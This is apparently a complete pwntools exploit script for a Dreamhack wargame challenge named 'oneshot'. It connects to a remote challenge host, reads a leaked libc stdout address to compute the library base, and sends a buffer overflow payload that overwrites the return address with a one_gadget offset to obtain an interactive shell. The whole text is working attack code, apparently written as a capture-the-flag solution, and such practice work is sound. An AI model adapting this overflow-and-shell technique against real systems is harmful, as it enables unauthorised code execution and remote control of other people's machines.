from pwn import *

# p = process("./oneshot")
p = remote("host3.dreamhack.games", 18915)
elf = ELF("./oneshot")
# libc = elf.libc
libc = ELF("./libc.so.6")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline()[:-1], 16)
base = stdout - libc.symbols["_IO_2_1_stdout_"]
one_gadget = base + 0x45216
pop_rax = base + 0x0000000000000287

p.recvuntil(b"MSG: ")
p.sendline(b"\0" * 0x20 + b"\0" * 0x8 + p64(one_gadget))


p.interactive()
